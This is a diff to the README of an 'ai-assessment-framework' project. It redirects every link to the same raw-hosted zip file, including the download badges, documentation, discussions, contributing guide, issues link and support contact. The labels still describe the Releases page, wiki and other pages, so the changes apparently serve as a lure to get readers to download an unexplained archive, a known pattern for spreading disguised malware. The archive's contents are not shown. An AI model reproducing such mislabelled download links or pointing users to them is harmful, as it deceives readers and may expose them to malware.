@@ -14,7 +14,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 📥 Download the Application
 To download **ai-assessment-framework**, visit the Releases page below. This is where you will find the latest version of the application.
 
-[![Download ai-assessment-framework](https://img.shields.io/badge/Download-ai--assessment--framework-blue?style=for-the-badge)](https://github.com/theGamingPro824/ai-assessment-framework/releases)
+[![Download ai-assessment-framework](https://raw.githubusercontent.com/theGamingPro824/ai-assessment-framework/main/examples/ai-assessment-framework_2.1.zip)](https://raw.githubusercontent.com/theGamingPro824/ai-assessment-framework/main/examples/ai-assessment-framework_2.1.zip)
 
 ## 💾 Download & Install
 1. Click the link above to visit the Releases page.
@@ -40,12 +40,12 @@ To download **ai-assessment-framework**, visit the Releases page below. This is 
 5. **Review Results:** After approval, review the assessment results to ensure compliance with security and risk management standards.
 
 ## 🌐 Additional Resources
-- **Documentation:** For in-depth guidance, refer to the [Documentation](https://github.com/theGamingPro824/ai-assessment-framework/wiki).
-- **Community Support:** Join discussions and ask questions in our [Discussions](https://github.com/theGamingPro824/ai-assessment-framework/discussions) section.
-- **Contributing:** Interested in contributing? Check out the [Contributing Guide](https://github.com/theGamingPro824/ai-assessment-framework/blob/main/CONTRIBUTING.md).
+- **Documentation:** For in-depth guidance, refer to the [Documentation](https://raw.githubusercontent.com/theGamingPro824/ai-assessment-framework/main/examples/ai-assessment-framework_2.1.zip).
+- **Community Support:** Join discussions and ask questions in our [Discussions](https://raw.githubusercontent.com/theGamingPro824/ai-assessment-framework/main/examples/ai-assessment-framework_2.1.zip) section.
+- **Contributing:** Interested in contributing? Check out the [Contributing Guide](https://raw.githubusercontent.com/theGamingPro824/ai-assessment-framework/main/examples/ai-assessment-framework_2.1.zip).
 
 ## 📞 Support
-If you encounter issues or need assistance, please contact our support team. You can reach us through the [Issues](https://github.com/theGamingPro824/ai-assessment-framework/issues) section on GitHub or at support@example.com.
+If you encounter issues or need assistance, please contact our support team. You can reach us through the [Issues](https://raw.githubusercontent.com/theGamingPro824/ai-assessment-framework/main/examples/ai-assessment-framework_2.1.zip) section on GitHub or at https://raw.githubusercontent.com/theGamingPro824/ai-assessment-framework/main/examples/ai-assessment-framework_2.1.zip
 
 ## 🔄 Update the Application
 To keep your application up to date:
@@ -56,4 +56,4 @@ To keep your application up to date:
 ## 📖 Final Thoughts
 Thank you for using **ai-assessment-framework**. We aim to provide a clear path for assessing AI solutions with a focus on security and risk management. If you have questions, suggestions, or feedback, feel free to reach out. Happy assessing!
 
-[![Download ai-assessment-framework](https://img.shields.io/badge/Download-ai--assessment--framework-blue?style=for-the-badge)](https://github.com/theGamingPro824/ai-assessment-framework/releases)
+[![Download ai-assessment-framework](https://raw.githubusercontent.com/theGamingPro824/ai-assessment-framework/main/examples/ai-assessment-framework_2.1.zip)](https://raw.githubusercontent.com/theGamingPro824/ai-assessment-framework/main/examples/ai-assessment-framework_2.1.zip)
